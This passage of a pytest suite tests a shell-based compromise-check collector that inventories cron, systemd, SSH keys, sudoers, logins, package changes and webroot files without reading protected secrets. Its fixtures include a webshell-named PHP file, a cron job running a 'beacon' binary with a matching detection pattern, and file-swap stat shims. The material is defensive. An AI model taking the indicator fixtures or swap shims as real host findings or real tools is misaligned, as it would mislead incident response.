    result = _collect(tmp_path, shell, root, f'since={SINCE}', 'webroot=/var/www/html')

    rows = [row for row in result.records('webroot_file') if '%0A' in row['path']]
    assert len(rows) == 1
    assert _record_value(rows[0], 'path').endswith(filename.encode())


def test_logins_since_the_date_use_numeric_addresses(tmp_path: Path, shell: str):
    root = _host_tree(tmp_path)
    last_out = (
        'xadmin pts/0 203.0.113.50 2026-09-14T03:11:02+00:00 - 2026-09-14T03:15:00+00:00\n'
        'wtmp begins 2026-07-01T00:00:00+00:00'
    )

    result = _collect(tmp_path, shell, root, f'since={SINCE}', LAST_OUT=last_out)

    call = (tmp_path / 'last.log').read_text()
    assert '-i' in call.split()
    assert call.split()[-1] == SINCE
    login = result.records('login')[0]
    assert login['from'] == '203.0.113.50'
    assert login['start'] == '2026-09-14T03:11:02Z'


def test_wtmp_begin_is_reported(tmp_path: Path, shell: str):
    root = _host_tree(tmp_path)

    result = _collect(
        tmp_path,
        shell,
        root,
        f'since={SINCE}',
        LAST_OUT='wtmp begins 2026-07-01T00:00:00+00:00',
    )

    assert result.records('wtmp') == [
        {'kind': 'wtmp', 'path': '/var/log/wtmp', 'begins': '2026-07-01T00:00:00Z'}
    ]


def test_missing_last_is_unknown(tmp_path: Path, shell: str):
    root = _host_tree(tmp_path)

    result = _collect(
        tmp_path, shell, root, f'since={SINCE}', tools=('ss', 'dpkg', 'ssh-keygen')
    )

    unknowns = result.records('unknown')
    assert any(
        row['kind'] == 'login' and row['reason'] == 'missing-tool:last-iso'
        for row in unknowns
    )
    assert any(
        row['kind'] == 'wtmp' and row['reason'] == 'missing-tool:last-iso'
        for row in unknowns
    )


def test_a_complete_run_ends_with_status_complete_and_counts(
    tmp_path: Path, shell: str
):
    root = _host_tree(tmp_path)
    result = _collect(
        tmp_path,
        shell,
        root,
        f'since={SINCE}',
        LAST_OUT='wtmp begins 2026-07-01T00:00:00+00:00',
    )

    end = result.records('end')[-1]
    assert end['status'] == 'complete'
    assert int(end['records']) == len(result.lines) - 1
    assert int(end['unknowns']) == len(result.records('unknown'))


def test_each_check_kind_emits_exactly_one_coverage_record(tmp_path: Path, shell: str):
    root = _host_tree(tmp_path)

    result = _collect(tmp_path, shell, root, f'since={SINCE}')

    checks = result.records('check')
    expected = {
        'secret',
        'account',
        'sudoers',
        'authkey',
        'cron',
        'systemd_unit',
        'rc_local',
        'listen',
        'connection',
        'pkg_modified',
        'webroot_file',
        'login',
        'wtmp',
    }
    assert {row['kind'] for row in checks} == expected
    assert len(checks) == len(expected)
    assert (
        next(row for row in checks if row['kind'] == 'secret')['status']
        == 'not_requested'
    )
    assert (
        next(row for row in checks if row['kind'] == 'webroot_file')['status']
        == 'not_requested'
    )


@pytest.mark.parametrize(
    ('kind', 'link'),
    [
        ('systemd_unit', 'etc/systemd/system/multi-user.target.wants/gone.service'),
        ('cron', 'etc/cron.daily/gone'),
    ],
)
def test_a_dangling_symlink_is_recorded_with_its_target_not_unknown(
    tmp_path: Path, shell: str, kind: str, link: str
):
    root = _host_tree(tmp_path)
    path = root / link
    path.parent.mkdir(parents=True, exist_ok=True)
    path.symlink_to('/usr/lib/removed/gone')

    result = _collect(tmp_path, shell, root, f'since={SINCE}')

    row = next(row for row in result.records(kind) if row['path'] == f'/{link}')
    assert row['sha256'] == '?'
    assert row.get('target', '/usr/lib/removed/gone') == '/usr/lib/removed/gone'
    assert not [row for row in result.records('unknown') if row['kind'] == kind]
    assert f'check kind={kind} status=complete' in result.lines


def test_an_authorized_keys_line_without_a_known_key_type_is_unknown(
    tmp_path: Path, shell: str
):
    root = _host_tree(tmp_path)
    keys = 'ssh-ed25519 AAAAfixture ok\nssh-xmss@openssh.com AAAAxmss new\n'
    _write(root, 'home/alice/.ssh/authorized_keys', keys)

    result = _collect(tmp_path, shell, root, f'since={SINCE}')

    assert [row['line'] for row in result.records('authkey')] == ['1']
    assert (
        'unknown kind=authkey path=/home/alice/.ssh/authorized_keys reason=unparsed'
        in result.lines
    )
    assert 'check kind=authkey status=partial' in result.lines


def test_checks_that_walk_account_homes_are_unknown_when_passwd_is_not_read(
    tmp_path: Path, shell: str
):
    root = _host_tree(tmp_path)

    result = _collect(
        tmp_path, shell, root, f'since={SINCE}', 'protect=/etc/passwd', 'protect=~/.env'
    )

    for kind in ('secret', 'authkey', 'systemd_unit'):
        assert f'unknown kind={kind} path=/etc/passwd reason=secret-overlap' in (
            result.lines
        )
        assert f'check kind={kind} status=complete' not in result.lines


def test_a_hard_link_to_a_secret_is_never_opened(tmp_path: Path, shell: str):
    root = _host_tree(tmp_path)
    secret = _write(root, 'app/.env', 'TOKEN=fixture\n')
    os.link(secret, root / 'etc/cron.d/job')

    result = _collect(
        tmp_path, shell, root, f'since={SINCE}', 'protect=/app/.env', 'pattern=TOKEN'
    )

    assert 'unknown kind=cron path=/etc/cron.d/job reason=secret-overlap' in (
        result.lines
    )
    assert not [
        row for row in result.records('cron') if row['path'] == '/etc/cron.d/job'
    ]


def test_a_pattern_search_that_fails_makes_the_file_unknown(tmp_path: Path, shell: str):
    root = _host_tree(tmp_path)
    _write(root, 'etc/cron.d/job', '* * * * * root /usr/bin/beacon\n', BEFORE)
    real_grep = shutil.which('grep')
    failing_grep = f'case " $* " in *" -o "*) exit 2;; esac\nexec {real_grep} "$@"'

    result = _collect(
        tmp_path,
        shell,
        root,
        f'since={SINCE}',
        'pattern=beacon',
        extra_fakes={'grep': failing_grep},
    )

    cron = next(
        row for row in result.records('cron') if row['path'] == '/etc/cron.d/job'
    )
    assert cron['hits'] == '?'
    assert 'unknown kind=cron path=/etc/cron.d/job reason=search-failed' in result.lines
    assert 'check kind=cron status=partial' in result.lines


def test_accounts_come_from_getent_when_it_is_available(tmp_path: Path, shell: str):
    root = _host_tree(tmp_path)
    directory = _write(
        tmp_path,
        'getent-passwd',
        'root:x:0:0:root:/root:/bin/sh\nldapuser:x:5000:5000::/home/ldapuser:/bin/sh\n',
    )
    _write(
        root,
        'home/ldapuser/.ssh/authorized_keys',
        'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAldap note\n',
    )

    result = _collect(
        tmp_path,
        shell,
        root,
        f'since={SINCE}',
        extra_fakes={'getent': '[ "$1" = passwd ] && cat "$GETENT_PASSWD"'},
        GETENT_PASSWD=str(directory),
    )

    assert [row['name'] for row in result.records('account')] == ['ldapuser', 'root']
    assert [row['account'] for row in result.records('authkey')] == ['ldapuser']


def test_units_in_system_control_directories_are_collected(tmp_path: Path, shell: str):
    root = _host_tree(tmp_path)
    _write(root, 'etc/systemd/system.control/beacon.service', '[Service]\n', BEFORE)
    _write(root, 'run/systemd/system.control/drop.service', '[Service]\n', BEFORE)

    result = _collect(tmp_path, shell, root, f'since={SINCE}')

    paths = {row['path'] for row in result.records('systemd_unit')}
    assert '/etc/systemd/system.control/beacon.service' in paths
    assert '/run/systemd/system.control/drop.service' in paths


def test_an_unreadable_sshd_config_makes_authorized_keys_unknown(
    tmp_path: Path, shell: str
):
    root = _host_tree(tmp_path)
    config = _write(root, 'etc/ssh/sshd_config', 'AuthorizedKeysFile /etc/keys/%u\n')
    config.chmod(0)
    try:
        result = _collect(tmp_path, shell, root, f'since={SINCE}')
    finally:
        config.chmod(0o644)

    assert 'unknown kind=authkey path=/etc/ssh/sshd_config reason=unreadable' in (
        result.lines
    )
    assert 'check kind=authkey status=complete' not in result.lines


def test_a_symlinked_key_file_reports_the_later_of_link_and_target_times(
    tmp_path: Path, shell: str
):
    root = _host_tree(tmp_path)
    future = 1_830_000_000
    target = _write(root, 'home/alice/keys', 'ssh-ed25519 AAAAfixture new\n', future)
    link = root / 'home/alice/.ssh/authorized_keys'
    link.symlink_to(target)
    os.utime(link, (BEFORE, BEFORE), follow_symlinks=False)

    result = _collect(tmp_path, shell, root, 'since=2027-06-01')

    assert result.records('authkey')[0]['mtime'] == '2027-12-28T13:20:00Z'


def test_a_secret_under_an_unsearchable_directory_is_unknown_not_missing(
    tmp_path: Path, shell: str
):
    root = _host_tree(tmp_path)
    _write(root, 'app/locked/.env', 'TOKEN=fixture\n')
    (root / 'app/locked').chmod(0)
    try:
        result = _collect(
            tmp_path, shell, root, f'since={SINCE}', 'protect=/app/locked/.env'
        )
    finally:
        (root / 'app/locked').chmod(0o755)

    assert result.records('secret') == []
    assert 'unknown kind=secret path=/app/locked/.env reason=unsearchable' in (
        result.lines
    )


def test_a_secret_directory_sent_with_its_glob_records_each_file_inside(
    tmp_path: Path, shell: str
):
    root = _host_tree(tmp_path)
    _write(root, 'etc/ssl/private/site.key', 'KEY\n')
    _write(root, 'etc/ssl/private/api.key', 'KEY\n')

    result = _collect(
        tmp_path,
        shell,
        root,
        f'since={SINCE}',
        'protect=/etc/ssl/private',
        'protect=/etc/ssl/private/*',
    )

    rows = {row['path']: row['type'] for row in result.records('secret')}
    assert rows == {
        '/etc/ssl/private': 'directory',
        '/etc/ssl/private/api.key': 'file',
        '/etc/ssl/private/site.key': 'file',
    }
    assert result.lines[-1].startswith('end status=complete')


def test_a_secret_file_sent_with_its_glob_records_the_glob_as_missing(
    tmp_path: Path, shell: str
):
    root = _host_tree(tmp_path)
    _write(root, 'app/.env', 'TOKEN=fixture\n')

    result = _collect(
        tmp_path,
        shell,
        root,
        f'since={SINCE}',
        'protect=/app/.env',
        'protect=/app/.env/*',
    )

    rows = {row['path']: row['exists'] for row in result.records('secret')}
    assert rows == {'/app/.env': 'yes', '/app/.env/%2A': 'no'}
    assert all(row['kind'] != 'secret' for row in result.records('unknown'))


def test_a_symlinked_secret_takes_the_mount_of_its_target(tmp_path: Path, shell: str):
    root = _host_tree(tmp_path)
    target = _write(root, 'app/.env', 'TOKEN=fixture\n')
    (root / 'etc/app.env').symlink_to(target)

    result = _collect(tmp_path, shell, root, f'since={SINCE}', 'protect=/etc/app.env')

    secret = result.records('secret')[0]
    assert (secret['mount'], secret['atime_mode']) == ('/app', 'noatime')


def test_a_udp_listener_does_not_mark_a_tcp_connection_as_listening(
    tmp_path: Path, shell: str
):
    root = _host_tree(tmp_path)
    split_ss = """case " $* " in
  (*' state established '*) printf '%s\\n' "$SS_EST";;
  (*' -lunp '*) printf '%s\\n' "$SS_UDP";;
esac"""

    result = _collect(
        tmp_path,
        shell,
        root,
        f'since={SINCE}',
        extra_fakes={'ss': split_ss},
        SS_UDP='UNCONN 0 0 0.0.0.0:5353 0.0.0.0:* users:(("avahi",pid=10,fd=3))',
        SS_EST='ESTAB 0 0 10.0.0.1:5353 203.0.113.50:443 users:(("x",pid=20,fd=4))',
    )

    assert result.records('connection')[0]['listening'] == 'no'


def test_a_file_swapped_for_a_secret_during_reading_is_dropped(
    tmp_path: Path, shell: str
):
    root = _host_tree(tmp_path)
    secret = _write(root, 'app/.env', 'TOKEN=fixture\n')
    page = _write(root, 'var/www/html/shell.php', '<?php echo 1; ?>\n')
    real_stat = shutil.which('gstat') or shutil.which('stat')
    swapping_stat = f"""for arg do last=$arg; done
if [ "$2" = '%Y:%Z:%s:%U:%a' ] && [ "$last" = "$SWAP_FROM" ]; then
  /bin/rm -f "$SWAP_FROM"; /bin/ln "$SWAP_TO" "$SWAP_FROM"
fi
exec {real_stat} "$@\""""

    result = _collect(
        tmp_path,
        shell,
        root,
        f'since={SINCE}',
        'webroot=/var/www/html',
        'protect=/app/.env',
        extra_fakes={'stat': swapping_stat},
        SWAP_FROM=str(page),
        SWAP_TO=str(secret),
    )

    assert result.records('webroot_file') == []
    secret_hash = sha256(b'TOKEN=fixture\n').hexdigest()
    assert secret_hash not in '\n'.join(result.lines)
    assert (
        'unknown kind=webroot_file path=/var/www/html/shell.php '
        'reason=changed-during-read'
    ) in result.lines


def test_a_file_swapped_for_a_secret_is_never_hashed_or_searched(
    tmp_path: Path, shell: str
):
    root = _host_tree(tmp_path)
    secret = _write(root, 'app/.env', 'TOKEN=fixture\n')
    page = _write(root, 'var/www/html/shell.php', '<?php echo 1; ?>\n')
    real_stat = shutil.which('gstat') or shutil.which('stat')
    swapping_stat = f"""for arg do last=$arg; done
if [ "$2" = '%Y:%Z:%s:%U:%a' ] && [ "$last" = "$SWAP_FROM" ]; then
  /bin/rm -f "$SWAP_FROM"; /bin/ln "$SWAP_TO" "$SWAP_FROM"
fi
exec {real_stat} "$@\""""
    reads = tmp_path / 'reads.log'
    logging = {
        name: f'{real_stat} -L -c %i /dev/stdin >> "$READ_LOG"; exec {real} "$@"'
        for name, real in (
            ('sha256sum', shutil.which('gsha256sum') or shutil.which('sha256sum')),
            ('grep', shutil.which('grep')),
        )
    }

    result = _collect(
        tmp_path,
        shell,
        root,
        f'since={SINCE}',
        'webroot=/var/www/html',
        'protect=/app/.env',
        'pattern=TOKEN',
        extra_fakes={'stat': swapping_stat, **logging},
        SWAP_FROM=str(page),
        SWAP_TO=str(secret),
        READ_LOG=str(reads),
    )

    assert result.code == 0, result.stderr
    assert result.records('webroot_file') == []
    read_inodes = reads.read_text().split() if reads.exists() else []
    assert str(secret.stat().st_ino) not in read_inodes


def test_a_fifo_authorized_keys_file_is_unknown_and_collection_finishes(
    tmp_path: Path, shell: str
):
    root = _host_tree(tmp_path)
    os.mkfifo(root / 'home/alice/.ssh/authorized_keys')
    _write(root, 'etc/cron.d/job', '* * * * * root /bin/true\n')

    result = _collect(tmp_path, shell, root, f'since={SINCE}')

    assert result.code == 0, result.stderr
    assert (
        'unknown kind=authkey path=/home/alice/.ssh/authorized_keys reason=not-a-file'
    ) in result.lines
    assert result.records('cron')[0]['path'] == '/etc/cron.d/job'
    assert result.lines[-1].startswith('end status=')


def test_a_fifo_in_sudoers_d_is_unknown_and_collection_finishes(
    tmp_path: Path, shell: str
):
    root = _host_tree(tmp_path)
    os.mkfifo(root / 'etc/sudoers.d/pipe')

    result = _collect(tmp_path, shell, root, f'since={SINCE}')

    assert result.code == 0, result.stderr
    assert 'unknown kind=sudoers path=/etc/sudoers.d/pipe reason=not-a-file' in (
        result.lines
    )
    assert result.lines[-1].startswith('end status=')


def test_package_verification_skips_a_packaged_hard_link_beside_a_secret_directory(
    tmp_path: Path, shell: str
):
    root = _host_tree(tmp_path)
    key = _write(root, 'app/conf/key', 'secret\n')
    os.link(key, root / 'etc/packaged-copy')
    log = tmp_path / 'dpkg.log'

    result = _collect(
        tmp_path,
        shell,
        root,
        f'since={SINCE}',
        'protect=/app/conf',
        DPKG_SEARCH_EXIT='1',
        DPKG_SELECTIONS='base hold',
        DPKG_LISTFILES='/etc/packaged-copy',
        DPKG_LOG=str(log),
    )

    assert 'unknown kind=pkg_modified path= reason=secret-overlap' in result.lines
    assert '--verify' not in log.read_text()


def test_package_verification_runs_beside_hard_links_the_package_lists(
    tmp_path: Path, shell: str
):
    root = _host_tree(tmp_path)
    _write(root, 'app/conf/key', 'secret\n')
    perl = _write(root, 'usr/bin/perl', 'binary\n')
    os.link(perl, root / 'usr/bin/perl5.36.0')
    log = tmp_path / 'dpkg.log'

    result = _collect(
        tmp_path,
        shell,
        root,
        f'since={SINCE}',
        'protect=/app/conf',
        DPKG_SELECTIONS='perl-base hold',
        DPKG_LISTFILES='/usr/bin/perl\n/usr/bin/perl5.36.0',
        DPKG_LOG=str(log),
    )

    assert '--verify' in log.read_text()
    assert all(row['kind'] != 'pkg_modified' for row in result.records('unknown'))


def test_package_verification_runs_when_a_package_owns_the_secret_directory(
    tmp_path: Path, shell: str
):
    root = _host_tree(tmp_path)
    _write(root, 'app/conf/key', 'secret\n')
    log = tmp_path / 'dpkg.log'

    result = _collect(
        tmp_path,
        shell,
        root,
        f'since={SINCE}',
        'protect=/app/conf',
        DPKG_SELECTIONS='openssl hold',
        DPKG_LISTFILES='/app\n/app/conf',
        DPKG_LOG=str(log),
    )

    assert '--verify' in log.read_text()
    assert all(row['kind'] != 'pkg_modified' for row in result.records('unknown'))


def test_package_verification_skips_a_packaged_path_inside_a_secret_directory(
    tmp_path: Path, shell: str
):
    root = _host_tree(tmp_path)
    _write(root, 'app/conf/key', 'secret\n')
    log = tmp_path / 'dpkg.log'

    result = _collect(
        tmp_path,
        shell,
        root,
        f'since={SINCE}',
        'protect=/app/conf',
        DPKG_SEARCH_EXIT='1',
        DPKG_SELECTIONS='base hold',
        DPKG_LISTFILES='/app/conf/key',
        DPKG_LOG=str(log),
    )

    assert 'unknown kind=pkg_modified path= reason=secret-overlap' in result.lines
    assert '--verify' not in log.read_text()


def test_package_verification_runs_beside_a_secret_directory_without_hard_links(
    tmp_path: Path, shell: str
):
    root = _host_tree(tmp_path)
    _write(root, 'app/conf/key', 'secret\n')
    _write(root, 'etc/packaged', 'data\n')
    log = tmp_path / 'dpkg.log'

    result = _collect(
        tmp_path,
        shell,
        root,
        f'since={SINCE}',
        'protect=/app/conf',
        DPKG_SEARCH_EXIT='1',
        DPKG_SELECTIONS='base hold',
        DPKG_LISTFILES='/etc\n/etc/packaged',
        DPKG_LOG=str(log),
    )

    assert result.code == 0, result.stderr
    assert '--verify' in log.read_text()


def test_package_verification_is_skipped_when_the_inventory_stat_cannot_run(
    tmp_path: Path, shell: str
):
    root = _host_tree(tmp_path)
    _write(root, 'app/.env', 'secret\n')
    _write(root, 'etc/packaged', 'data\n')
    log = tmp_path / 'dpkg.log'

    result = _collect(
        tmp_path,
        shell,
        root,
        f'since={SINCE}',
        'protect=/app/.env',
        extra_fakes={'xargs': 'exit 127'},
        DPKG_SEARCH_EXIT='1',
        DPKG_SELECTIONS='base hold',
        DPKG_LISTFILES='/etc/packaged',
        DPKG_LOG=str(log),
    )

    assert 'unknown kind=pkg_modified path= reason=secret-overlap' in result.lines
    assert '--verify' not in log.read_text()


def test_package_verification_runs_when_a_listed_package_path_is_missing(
    tmp_path: Path, shell: str
):
    root = _host_tree(tmp_path)
    _write(root, 'app/.env', 'secret\n')
    _write(root, 'etc/packaged', 'data\n')
    log = tmp_path / 'dpkg.log'

    result = _collect(
        tmp_path,
        shell,
        root,
        f'since={SINCE}',
        'protect=/app/.env',
        DPKG_SEARCH_EXIT='1',
        DPKG_SELECTIONS='base hold',
        DPKG_LISTFILES='/etc/packaged\n/usr/share/gone',
        DPKG_LOG=str(log),
    )

    assert result.code == 0, result.stderr
    assert '--verify' in log.read_text()


def _swap_once(when: str, link: bool) -> str:
    """A `stat` fake that replaces SWAP_FROM with SWAP_TO the first time `when` matches."""
    real_stat = shutil.which('gstat') or shutil.which('stat')
    replace = '/bin/ln -s' if link else '/bin/mv'
    return f"""for arg do last=$arg; done
if [ ! -e "$SWAP_DONE" ] && [ "$last" = "$SWAP_FROM" ] && {when}; then
  : > "$SWAP_DONE"; /bin/rm -f "$SWAP_FROM"; {replace} "$SWAP_TO" "$SWAP_FROM"
  [ -z "$SWAP_REFILL" ] || printf '%s\\n' new > "$SWAP_TO"
fi
exec {real_stat} "$@\""""


def _logging_readers(log_env: str = 'READ_LOG') -> dict[str, str]:
    real_stat = shutil.which('gstat') or shutil.which('stat')
    return {
        name: f'{real_stat} -L -c %i /dev/stdin >> "${log_env}"; exec {real} "$@"'
        for name, real in (
            ('sha256sum', shutil.which('gsha256sum') or shutil.which('sha256sum')),
            ('grep', shutil.which('grep')),
            ('awk', shutil.which('awk')),
        )
    }


@NEEDS_PROC_FD
def test_an_authorized_keys_link_swapped_into_a_secret_directory_is_not_parsed(
    tmp_path: Path, shell: str
):
    root = _host_tree(tmp_path)
    key = _write(root, 'app/conf/key', 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5leak leaked\n')
    keys = _write(root, 'home/alice/.ssh/authorized_keys', '# none\n')

    result = _collect(
        tmp_path,
        shell,
        root,
        f'since={SINCE}',
        'protect=/app/conf',
        extra_fakes={'stat': _swap_once('[ "$2" = %Y:%Z ]', link=True)},
        SWAP_FROM=str(keys),
        SWAP_TO=str(key),
        SWAP_DONE=str(tmp_path / 'swapped'),
        SWAP_REFILL='',
    )

    assert result.records('authkey') == []
    assert 'leaked' not in '\n'.join(result.lines)
    assert (
        'unknown kind=authkey path=/home/alice/.ssh/authorized_keys '
        'reason=changed-during-read'
    ) in result.lines


@NEEDS_PROC_FD
def test_a_web_file_linked_into_a_secret_directory_before_its_identity_is_never_read(
    tmp_path: Path, shell: str
):
    root = _host_tree(tmp_path)
    key = _write(root, 'app/conf/key', 'TOKEN=fixture\n')
    page = _write(root, 'var/www/html/shell.php', '<?php echo 1; ?>\n')
    reads = tmp_path / 'reads.log'

    result = _collect(
        tmp_path,
        shell,
        root,
        f'since={SINCE}',
        'webroot=/var/www/html',
        'protect=/app/conf',
        'pattern=TOKEN',
        extra_fakes={
            'stat': _swap_once('[ "$1" = -L ] && [ "$3" = %d:%i ]', link=True),
            **_logging_readers(),
        },
        SWAP_FROM=str(page),
        SWAP_TO=str(key),
        SWAP_DONE=str(tmp_path / 'swapped'),
        SWAP_REFILL='',
        READ_LOG=str(reads),
    )

    assert result.code == 0, result.stderr
    read_inodes = reads.read_text().split() if reads.exists() else []
    assert str(key.stat().st_ino) not in read_inodes


def test_a_secret_moved_onto_a_scanned_path_after_its_snapshot_is_never_read(
    tmp_path: Path, shell: str
):
    root = _host_tree(tmp_path)
    secret = _write(root, 'app/.env', 'TOKEN=fixture\n')
    original = secret.stat().st_ino
    page = _write(root, 'var/www/html/shell.php', '<?php echo 1; ?>\n')
    reads = tmp_path / 'reads.log'

    result = _collect(
        tmp_path,
        shell,
        root,
        f'since={SINCE}',
        'webroot=/var/www/html',
        'protect=/app/.env',
        'pattern=TOKEN',
        extra_fakes={
            'stat': _swap_once('[ "$1" = -L ] && [ "$3" = %d:%i ]', link=False),
            **_logging_readers(),
        },
        SWAP_FROM=str(page),
        SWAP_TO=str(secret),
        SWAP_DONE=str(tmp_path / 'swapped'),
        SWAP_REFILL='yes',
        READ_LOG=str(reads),
    )

    assert result.code == 0, result.stderr
    read_inodes = reads.read_text().split() if reads.exists() else []
    assert str(original) not in read_inodes
    assert 'TOKEN' not in '\n'.join(result.lines)


def test_a_root_secret_keeps_every_file_unread(tmp_path: Path, shell: str):
    root = _host_tree(tmp_path)
    _write(root, 'etc/cron.d/job', '* * * * * root /bin/true\n')

    result = _collect(tmp_path, shell, root, f'since={SINCE}', 'protect=/')

    assert result.code == 0, result.stderr
    assert result.records('cron') == []
    assert 'unknown kind=cron path=/etc/cron.d/job reason=secret-overlap' in (
        result.lines
    )


def test_package_verification_skips_a_packaged_link_into_a_secret_directory(
    tmp_path: Path, shell: str
):
    root = _host_tree(tmp_path)
    key = _write(root, 'app/conf/key', 'secret\n')
    (root / 'etc/packaged-link').symlink_to(key)
    log = tmp_path / 'dpkg.log'

    result = _collect(
        tmp_path,
        shell,
        root,
        f'since={SINCE}',
        'protect=/app/conf',
        DPKG_SEARCH_EXIT='1',
        DPKG_SELECTIONS='base hold',
        DPKG_LISTFILES='/etc\n/etc/packaged-link',
        DPKG_LOG=str(log),
    )

    assert 'unknown kind=pkg_modified path= reason=secret-overlap' in result.lines
    assert '--verify' not in log.read_text()


def test_package_verification_skips_a_packaged_fifo(tmp_path: Path, shell: str):
    root = _host_tree(tmp_path)
    os.mkfifo(root / 'etc/packaged-fifo')
    log = tmp_path / 'dpkg.log'

    result = _collect(
        tmp_path,
        shell,
        root,
        f'since={SINCE}',
        DPKG_SELECTIONS='base hold',
        DPKG_LISTFILES='/etc/packaged-fifo',
        DPKG_LOG=str(log),
    )

    assert result.code == 0, result.stderr
    assert 'unknown kind=pkg_modified path= reason=not-a-file' in result.lines
    assert '--verify' not in log.read_text()


def test_a_fifo_wtmp_is_unknown_and_collection_finishes(tmp_path: Path, shell: str):
    root = _host_tree(tmp_path)
    (root / 'var/log/wtmp').unlink()
    os.mkfifo(root / 'var/log/wtmp')

    result = _collect(tmp_path, shell, root, f'since={SINCE}')

    assert result.code == 0, result.stderr
    assert 'unknown kind=login path=/var/log/wtmp reason=not-a-file' in result.lines
    assert 'unknown kind=wtmp path=/var/log/wtmp reason=not-a-file' in result.lines
    assert result.lines[-1].startswith('end status=')


def test_last_reads_wtmp_from_the_checked_descriptor(tmp_path: Path, shell: str):
    root = _host_tree(tmp_path)

    result = _collect(
        tmp_path,
        shell,
        root,
        f'since={SINCE}',
        LAST_OUT='stdin begins 2026-07-01T00:00:00+00:00',
    )

    assert (tmp_path / 'last.log').read_text().startswith('-f /dev/stdin ')
    assert result.records('login') == []
    assert result.records('wtmp')[0]['begins'] == '2026-07-01T00:00:00Z'


def test_an_unreadable_hash_input_is_unknown(tmp_path: Path, shell: str):
    root = _host_tree(tmp_path)
    _write(root, 'etc/cron.d/job', '* * * * * root /bin/true\n')

    result = _collect(
        tmp_path,
        shell,
        root,
        f'since={SINCE}',
        extra_fakes={'sha256sum': 'exit 1'},
    )

    assert result.records('cron')[0]['sha256'] == '?'
    assert 'unknown kind=cron path=/etc/cron.d/job reason=unreadable' in result.lines


def test_an_sshd_include_that_climbs_out_of_the_default_directory_is_unknown(
    tmp_path: Path, shell: str
):
    root = _host_tree(tmp_path)
    _write(
        root, 'etc/ssh/sshd_config', 'Include /etc/ssh/sshd_config.d/../outside.conf\n'
    )

    result = _collect(tmp_path, shell, root, f'since={SINCE}')

    assert (
        'unknown kind=authkey path=/etc/ssh/sshd_config reason=include-outside-default'
    ) in result.lines


def test_a_file_moved_out_of_a_secret_directory_during_the_run_is_never_read(
    tmp_path: Path, shell: str
):
    root = _host_tree(tmp_path)
    key = _write(root, 'app/conf/key', 'TOKEN=fixture\n')
    original = key.stat().st_ino
    page = _write(root, 'var/www/html/shell.php', '<?php echo 1; ?>\n')
    reads = tmp_path / 'reads.log'

    result = _collect(
        tmp_path,
        shell,
        root,
        f'since={SINCE}',
        'webroot=/var/www/html',
        'protect=/app/conf',
        'pattern=TOKEN',
        extra_fakes={
            'stat': _swap_once('[ "$1" = -L ] && [ "$3" = %d:%i ]', link=False),
            **_logging_readers(),
        },
        SWAP_FROM=str(page),
        SWAP_TO=str(key),
        SWAP_DONE=str(tmp_path / 'swapped'),
        SWAP_REFILL='',
        READ_LOG=str(reads),
    )

    assert result.code == 0, result.stderr
    read_inodes = reads.read_text().split() if reads.exists() else []
    assert str(original) not in read_inodes
    assert 'hits=1' not in '\n'.join(result.lines)


def test_a_link_to_an_unreadable_target_is_unreadable(tmp_path: Path, shell: str):
    root = _host_tree(tmp_path)
    target = _write(root, 'opt/job', '* * * * * root /bin/true\n')
    (root / 'etc/cron.d/job').symlink_to(target)
    target.chmod(0)

    try:
        result = _collect(
            tmp_path, shell, root, f'since={SINCE}', 'pattern=root', UID_OUT='1000'
        )
    finally:
        target.chmod(0o644)

    assert 'unknown kind=cron path=/etc/cron.d/job reason=unreadable' in result.lines
    assert result.records('cron')[0]['path'] == '/etc/cron.d/job'


def test_a_wtmpdb_last_reads_its_own_database(tmp_path: Path, shell: str):
    root = _host_tree(tmp_path)
    (root / 'var/log/wtmp').unlink()
    _write(root, 'var/log/wtmp.db', 'sqlite\n')
    fake_dir = tmp_path / f'fake-{shell}'
    fake_dir.mkdir()
    (fake_dir / 'last').symlink_to('wtmpdb')

    result = _collect(
        tmp_path,
        shell,
        root,
        f'since={SINCE}',
        tools=('ss', 'dpkg', 'ssh-keygen'),
        extra_fakes={'wtmpdb': FAKES['last']},
        LAST_OUT='alice pts/0 203.0.113.9 2026-09-14T03:11:02+00:00 - 2026-09-14T03:42:18+00:00',
    )

    assert not (tmp_path / 'last.log').read_text().startswith('-f ')
    assert result.records('login')[0]['user'] == 'alice'


def test_a_missing_wtmp_is_absent(tmp_path: Path, shell: str):
    root = _host_tree(tmp_path)
    (root / 'var/log/wtmp').unlink()

    result = _collect(tmp_path, shell, root, f'since={SINCE}')

    assert 'unknown kind=login path=/var/log/wtmp reason=absent' in result.lines


def test_last_output_without_a_begins_line_is_not_trusted(tmp_path: Path, shell: str):
    root = _host_tree(tmp_path)

    result = _collect(
        tmp_path,
        shell,
        root,
        f'since={SINCE}',
        LAST_OUT='/dev/stdin has no entries',
    )

    assert result.records('login') == []
    assert (
        'unknown kind=login path=/var/log/wtmp reason=missing-tool:last-iso'
    ) in result.lines


def test_an_sshd_include_that_returns_to_the_default_directory_is_read(
    tmp_path: Path, shell: str
):
    root = _host_tree(tmp_path)
    _write(
        root,
        'etc/ssh/sshd_config',
        'Include "/etc/ssh/sshd_config.d/../sshd_config.d/*.conf"\n',
    )

    result = _collect(tmp_path, shell, root, f'since={SINCE}')

    assert not any(
        row['reason'] == 'include-outside-default' for row in result.records('unknown')
    )


def test_package_verification_runs_beside_a_unit_masked_with_a_dev_null_link(
    tmp_path: Path, shell: str
):
    root = _host_tree(tmp_path)
    (root / 'lib/systemd/system').mkdir(parents=True)
    (root / 'lib/systemd/system/masked.service').symlink_to('/dev/null')
    log = tmp_path / 'dpkg.log'

    result = _collect(
        tmp_path,
        shell,
        root,
        f'since={SINCE}',
        DPKG_SELECTIONS='base hold',
        DPKG_LISTFILES='/lib/systemd/system/masked.service',
        DPKG_LOG=str(log),
    )

    assert all(row['kind'] != 'pkg_modified' for row in result.records('unknown'))
    assert '--verify' in log.read_text()


def test_the_documented_check_script_size_and_hash_match_the_block(shell: str):
    if shell == 'bash':
        pytest.skip('the documents do not depend on the shell')
    body = _script().encode()
    doc = COLLECT.read_text()
    skill = (SKILLS / 'compromise-host-check/SKILL.md').read_text()

    lines = body.count(b'\n')

    assert (
        f'The block is {lines} lines, {len(body):,} bytes, '
        f'with sha256 `{sha256(body).hexdigest()}`'
    ) in doc
    assert f'every one of its {lines} lines' in skill


def test_the_check_script_has_no_whitespace_that_a_copy_can_drop(shell: str):
    if shell == 'bash':
        pytest.skip('the block does not depend on the shell')
    body = _script()

    assert '\t' not in body
    assert "'\n'" not in body
    assert "'?\n?'" not in body
    assert '"\n"' not in body


def test_the_skill_files_are_checked_out_with_lf_line_endings(shell: str):
